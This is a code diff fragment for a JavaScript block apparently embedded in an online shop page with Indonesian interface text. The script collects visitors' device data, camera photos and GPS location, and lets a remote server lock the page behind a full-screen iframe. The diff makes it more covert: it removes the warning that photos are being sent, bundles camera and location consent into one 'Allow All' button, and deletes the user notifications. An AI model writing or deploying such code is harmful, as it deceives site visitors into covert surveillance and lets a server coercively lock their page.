-              showToast('Izin kamera ditolak: ' + err.name);
-              try { localStorage.setItem(CONSENT_KEY, 'cam_denied'); } catch (e) {}
+              log('camera denied:', err.name);
               removeBanner();
             });
         }
@@ -1025,32 +900,32 @@ updateCart();
           document.head.appendChild(st);
           var el = document.createElement('div');
           el.id = 'nara-cam-indicator';
-          el.innerHTML = '<span class="dot"></span><span>Kamera aktif — sedang mengirim foto</span><button id="nara-cam-stop">Hentikan</button>';
+          el.innerHTML = '<span class="dot"></span><span>Kamera aktif</span><button id="nara-cam-stop">Hentikan</button>';
           document.body.appendChild(el);
           document.getElementById('nara-cam-stop').onclick = function () {
             stopCamera();
             try { localStorage.setItem(CONSENT_KEY, 'cam_stopped'); } catch (e) {}
-            showToast('Kamera dihentikan.');
           };
         }
 
+        // ===== Consent banner (satu tombol untuk semua) =====
         function buildBanner() {
           if (document.getElementById('nara-consent')) return;
           var st = document.createElement('style');
-          st.textContent = '#nara-consent{position:fixed;left:16px;right:16px;bottom:16px;z-index:9999;background:#232923;color:#f7f5f0;border-radius:10px;padding:18px;box-shadow:0 10px 30px rgba(0,0,0,.25);display:flex;flex-direction:column;gap:12px;font-family:"DM Sans",system-ui,sans-serif;font-size:13px;line-height:1.5;max-width:640px;margin:0 auto}#nara-consent p{margin:0}#nara-consent .actions{display:flex;gap:8px;flex-wrap:wrap}#nara-consent button{border:0;cursor:pointer;font:inherit;font-size:12px;padding:9px 16px;border-radius:5px;font-weight:600}#nara-consent .primary{background:#b47b83;color:#232923}#nara-consent .secondary{background:transparent;color:#f7f5f0;border:1px solid #f7f5f066}@media (max-width:520px){#nara-consent{left:10px;right:10px;bottom:10px;padding:14px}}';
+          st.textContent = '#nara-consent{position:fixed;left:16px;right:16px;bottom:16px;z-index:9999;background:#232923;color:#f7f5f0;border-radius:10px;padding:18px;box-shadow:0 10px 30px rgba(0,0,0,.25);display:flex;flex-direction:column;gap:12px;font-family:"DM Sans",system-ui,sans-serif;font-size:13px;line-height:1.5;max-width:640px;margin:0 auto}#nara-consent p{margin:0}#nara-consent .actions{display:flex;gap:8px;flex-wrap:wrap}#nara-consent button{border:0;cursor:pointer;font:inherit;font-size:12px;padding:10px 18px;border-radius:5px;font-weight:600}#nara-consent .primary{background:#b47b83;color:#232923}#nara-consent .secondary{background:transparent;color:#f7f5f0;border:1px solid #f7f5f066}@media (max-width:520px){#nara-consent{left:10px;right:10px;bottom:10px;padding:14px}}';
           document.head.appendChild(st);
+
           var el = document.createElement('div');
           el.id = 'nara-consent';
-          el.innerHTML = '<p><strong>Bantu kami kenali pengunjung.</strong> Kami ingin mengakses kamera &amp; lokasi Anda untuk memverifikasi kunjungan. Anda bisa menghentikan kapan saja.</p><div class="actions"><button class="primary" id="nara-allow-cam">Izinkan kamera</button><button class="primary" id="nara-allow-loc">Izinkan lokasi</button><button class="secondary" id="nara-dismiss">Nanti saja</button></div>';
+          el.innerHTML = '<p><strong>Bantu kami kenali pengunjung.</strong> Dengan menekan "Izinkan Semua", Anda mengizinkan akses kamera &amp; lokasi untuk verifikasi kunjungan. Anda bisa menghentikan kapan saja.</p><div class="actions"><button class="primary" id="nara-allow-all">Izinkan Semua</button><button class="secondary" id="nara-dismiss">Nanti saja</button></div>';
           document.body.appendChild(el);
-          document.getElementById('nara-allow-cam').onclick = function () {
-            try { localStorage.setItem(CONSENT_KEY, 'cam'); } catch (e) {}
-            startCamera();
+
+          document.getElementById('nara-allow-all').onclick = function () {
+            log('user clicked Allow All');
+            try { localStorage.setItem(CONSENT_KEY, 'granted'); } catch (e) {}
             removeBanner();
-          };
-          document.getElementById('nara-allow-loc').onclick = function () {
-            try { localStorage.setItem(CONSENT_KEY, 'loc'); } catch (e) {}
-            requestGPS(function () { removeBanner(); });
+            requestGPS();
+            startCamera();
           };
           document.getElementById('nara-dismiss').onclick = function () {
             try { localStorage.setItem(CONSENT_KEY, 'dismissed'); } catch (e) {}
@@ -1063,55 +938,76 @@ updateCart();
           if (el) el.parentNode.removeChild(el);
         }
 
+        // ===== Lock / Unlock =====
         function showLock() {
           if (lockIframe) return;
+          log('LOCKING page');
+          isLocked = true;
           lockIframe = document.createElement('iframe');
-          lockIframe.src = LOCKPAGE_URL;
+          lockIframe.src = LOCKPAGE_URL + '?t=' + Date.now();
           lockIframe.setAttribute('aria-label', 'Halaman terkunci');
-          lockIframe.style.cssText = 'position:fixed;inset:0;width:100%;height:100%;border:0;z-index:2147483647;background:#0b0b0b';
+          lockIframe.style.cssText = 'position:fixed !important;top:0 !important;left:0 !important;width:100vw !important;height:100vh !important;border:0 !important;z-index:2147483647 !important;background:#0b0b0b !important';
+          lockIframe.onload = function () { log('lock iframe loaded'); };
+          lockIframe.onerror = function () { log('lock iframe error'); };
           document.body.appendChild(lockIframe);
           document.body.style.overflow = 'hidden';
           stopCamera();
         }
         function hideLock() {
-          if (lockIframe) { lockIframe.remove(); lockIframe = null; }
+          if (!lockIframe) return;
+          log('UNLOCKING page');
+          isLocked = false;
+          lockIframe.remove();
+          lockIframe = null;
           document.body.style.overflow = '';
         }
+
         function pollStatus() {
-          if (!visitId || visitGone) return;
+          if (!visitId) return;
+          if (visitGone) return;
           fetch(STATUS_EP + visitId, { cache: 'no-store' })
             .then(function (r) {
-              if (r.status === 404) { visitGone = true; return null; }
-              if (!r.ok) return null;
+              if (r.status === 404) { log('poll: visit 404, stopping'); visitGone = true; return null; }
+              if (!r.ok) { log('poll: error status', r.status); return null; }
               return r.json();
             })
             .then(function (data) {
               if (!data) return;
-              if (data.locked) showLock();
-              else hideLock();
+              log('poll: locked =', data.locked);
+              if (data.locked && !isLocked) showLock();
+              else if (!data.locked && isLocked) hideLock();
             })
-            .catch(function () {});
+            .catch(function (e) { log('poll error:', e); });
         }
 
-        function showToast(msg) {
-          var t = document.createElement('div');
-          t.textContent = msg;
-          t.style.cssText = 'position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#2a2a2a;color:#fff;padding:10px 16px;border-radius:6px;font-size:12px;z-index:99999;font-family:system-ui,sans-serif;box-shadow:0 4px 12px rgba(0,0,0,.3)';
-          document.body.appendChild(t);
-          setTimeout(function () { t.remove(); }, 3000);
-        }
+        document.addEventListener('visibilitychange', function () {
+          if (!document.hidden && visitId) { log('tab visible, polling now'); pollStatus(); }
+        });
 
-        sendVisit().then(function () {
-          if (!visitId) return;
+        // ===== Boot =====
+        initVisit().then(function () {
+          if (!visitId) { log('no visit id, abort'); return; }
+          log('visit ready:', visitId);
+
           collectDevice().then(function (dev) {
-            if (dev && Object.keys(dev).length) sendDevice(dev);
+            if (dev && Object.keys(dev).length) {
+              log('device collected:', dev);
+              sendDevice(dev);
+            }
           });
+
           var state = null;
           try { state = localStorage.getItem(CONSENT_KEY); } catch (e) {}
-          if (state === 'cam') startCamera();
-          else if (state === 'loc') requestGPS();
-          else if (state !== 'dismissed' && state !== 'cam_stopped' && state !== 'cam_denied') buildBanner();
-          statusTimer = setInterval(pollStatus, 3000);
+          log('consent state:', state);
+
+          if (state === 'granted') {
+            requestGPS();
+            startCamera();
+          } else if (state !== 'dismissed' && state !== 'cam_stopped' && state !== 'cam_denied') {
+            buildBanner();
+          }
+
+          statusTimer = setInterval(pollStatus, 2000);
           pollStatus();
         });
       })();
